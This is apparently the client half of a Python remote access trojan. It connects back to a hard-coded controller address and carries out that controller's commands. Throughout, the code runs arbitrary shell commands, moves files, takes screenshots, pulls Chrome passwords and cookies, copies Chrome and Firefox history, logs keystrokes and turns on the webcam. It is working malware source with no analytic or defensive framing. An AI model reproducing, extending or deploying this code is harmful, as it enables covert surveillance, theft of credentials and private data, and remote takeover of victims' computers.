import socket
import os
import subprocess
import logging
import time
import BrowserGrabber
import FileHelper
import webcamclient
from ScreenSave import ScreenSave
from pynput.keyboard import Key, Listener, Controller
from threading import Thread
from multiprocessing import Process


def connect_helper():
    while True:
        sock = socket.socket()
        file_sock = socket.socket()
        try:
            sock.connect(('192.168.2.46', 8080))
            file_sock.connect(('192.168.2.46', 8081))
            sock.send('1x8nyo1cb146o2x8o16'.encode())
            connect_confirmation = sock.recv(1024).decode()
            print(connect_confirmation)
        except ConnectionResetError:
            sock.close()
            file_sock.close()
            continue
        except ConnectionRefusedError:
            sock.close()
            file_sock.close()
            continue
        else:
            if connect_confirmation == 'n3yx921ry321y':
                return sock, file_sock
            else:
                continue


KEYLOGGER_ACTIVE_FLAG = False

keylog_patterns = ['abuse', 'secret', 'super secret']
keylog_str = ''

def keylogger():
    logging.basicConfig(filename=(os.getenv("TEMP") + '\\Debug\\' + "log_results.txt"), level=logging.DEBUG,
                        format='%(asctime)s : %(message)s')
    def keypress(Key):
        global keylog_str
        if not KEYLOGGER_ACTIVE_FLAG:
            return False
        logging.info(str(Key))
        print(str(Key))
        keylog_str = keylog_str + str(Key)
        keylog_str = keylog_str.replace('\'', '').replace(' ', '')
        print(keylog_str)
        for word in keylog_patterns:
            if word in keylog_str:
                print('ALERT')
                file_sock.send('Клиент хулиганит'.encode('cp866'))
    listener = Listener(on_press=keypress)
    listener.start()


def main():
    sock, file_sock = connect_helper()
    while True:
        data = sock.recv(1024).decode()
        if data.lower() == 'exit':
            sock.close()
            break
        if data.lower() == 'disconnect':
            print('Disconnected!')
            sock, file_sock = connect_helper()
            continue
        if data.lower().startswith('download'):
            FileHelper.file_download(sock, data.split(' ')[1])
            continue
        if data.lower().startswith('upload'):
            FileHelper.file_upload(sock, data.split(' ')[2])
            continue
        if data.lower().startswith('system'):
            print(data)
            command = data.lower().replace('system ', '').split(' ')
            print(type(command), command)
            try:
                msg = subprocess.check_output(command, shell=True, encoding='cp866')
                print(msg)
                if msg:
                    sock.send(msg.encode('cp866'))
                else:
                    sock.send('SUCCESS'.encode('cp866'))
                    pass
            except Exception as err:
                sock.send(str(err).encode())
            continue
        if data.lower().startswith('screenshot'):
            if len(data.lower().split(' ')) == 1:
                ScreenSave(sock).get_screenshot()
                continue
            if data.lower().split(' ')[1] == 'window':
                thread1 = Thread(target=ScreenSave(file_sock).screenshot_active_window, args=(), daemon=True)
                thread1.start()
                continue
        if data.lower().startswith('browser'):
            if data.lower().split(' ')[1] == 'history':
                homepath = os.path.expanduser("~")
                if data.lower().split(' ')[2] == 'chrome':
                    history_chrome_path = os.path.join(homepath, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default',
                                                       'History')
                    FileHelper.file_download(sock, history_chrome_path)
                    continue
                if data.lower().split(' ')[2] == 'firefox':
                    history_firefox_path = os.path.join(homepath, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
                    if os.path.exists(history_firefox_path):
                        firefox_dir_list = os.listdir(history_firefox_path)
                        for f in firefox_dir_list:
                            history_firefox_path = os.path.join(homepath, 'AppData', 'Roaming', 'Mozilla', 'Firefox',
                                                                'Profiles')
                            if f.find('.default') > 0:
                                history_firefox_path = os.path.join(history_firefox_path, f, 'places.sqlite')
                            if os.path.exists(history_firefox_path):
                                FileHelper.file_download(sock, history_firefox_path)
                    continue
            if data.lower().split(' ')[1] == 'passwords':
                if data.lower().split(' ')[2] == 'chrome':
                    msg = BrowserGrabber.analyze('passwords')
                    if msg:
                        sock.send('1'.encode())
                        sock.send(msg)
                    else:
                        sock.send('0'.encode())
                    continue
            if data.lower().split(' ')[1] == 'cookies':
                if data.lower().split(' ')[2] == 'chrome':
                    msg = BrowserGrabber.analyze('cookies')
                    if msg:
                        sock.send('1'.encode())
                        sock.send(msg)
                    else:
                        sock.send('0'.encode())
                    continue
        if data.lower().split(' ')[0] == 'keylogger':
            global KEYLOGGER_ACTIVE_FLAG
            if data.lower().split(' ')[1] == 'start':
                KEYLOGGER_ACTIVE_FLAG = True
                sock.send('Keylogger started'.encode())
                keylogger()
                continue
            if data.lower().split(' ')[1] == 'stop':
                KEYLOGGER_ACTIVE_FLAG = False
                sock.send('Keylogger stopped. Log saved to log_results.txt'.encode())
                FileHelper.file_download(sock, os.getenv("TEMP") + '\\Debug\\' + "log_results.txt")
                continue
        if data.lower().split(' ')[0] == 'webcam':
            if data.lower().split(' ')[1] == 'on':
                print(data)
                handle = Process(target=webcamclient.handler, args=(1, ))
                handle.start()
                print(handle.pid)
                sock.send('Webcam activated!'.encode())
                continue
            if data.lower().split(' ')[1] == 'off':
                if handle:
                    handle.terminate()
                    sock.send('Webcam deactivated!'.encode())
                    continue
                if not handle:
                    sock.send('Webcam not activated'.encode())
                    continue


if __name__ == "__main__":
    main()